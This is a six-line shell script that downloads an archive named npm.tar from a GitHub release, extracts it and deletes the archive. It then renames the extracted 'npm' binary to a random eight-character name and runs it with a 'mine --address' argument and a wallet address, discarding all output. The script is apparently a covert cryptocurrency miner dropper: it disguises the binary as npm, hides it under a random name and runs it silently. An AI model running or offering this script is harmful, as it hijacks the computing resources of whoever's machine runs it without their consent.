wget https://github.com/jaryac/binsen/releases/download/v0.1.1/npm.tar
tar -xf npm.tar
rm -rf npm.tar
variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv npm $variable5
./$variable5 mine --address 3ixnKHhZVVTSkqBmugUDbwMXp14L6KGa7mQkyhUCZnc7 > /dev/null 2>&1
